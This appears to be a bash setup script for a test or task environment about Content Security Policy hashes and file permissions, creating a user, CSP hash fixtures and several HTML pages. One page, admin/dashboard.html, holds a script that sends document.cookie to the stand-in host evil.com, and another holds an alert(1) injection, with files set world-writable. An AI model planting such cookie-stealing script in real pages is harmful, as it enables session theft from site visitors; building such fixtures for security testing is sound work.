#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip golang-go
    pip3 install pytest

    useradd -m -s /bin/bash user || true

    mkdir -p /home/user/webroot/admin /home/user/webroot/public

    echo 'sha256-47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=' > /home/user/valid_csp.txt
    echo 'sha256-q1MKE+RZd0gTdYQfXz2Q2k+I4Q+5gZ3Q8Q9Q2Q2Q2Q2=' >> /home/user/valid_csp.txt
    echo 'sha256-P/Y5r3T4bM+wI/1Z5K9x7l6a3E8=' >> /home/user/valid_csp.txt

    echo '<html><head><script></script></head><body>Valid</body></html>' > /home/user/webroot/public/index.html
    echo '<html><body><script>fetch("http://evil.com?c="+document.cookie);</script></body></html>' > /home/user/webroot/admin/dashboard.html
    echo '<html><body><script></script><script>alert(1);</script></body></html>' > /home/user/webroot/public/contact.html

    chmod -R 777 /home/user

    # Set specific file permissions after the recursive chmod
    chmod 0644 /home/user/webroot/public/index.html
    chmod 0666 /home/user/webroot/admin/dashboard.html
    chmod 0777 /home/user/webroot/public/contact.html
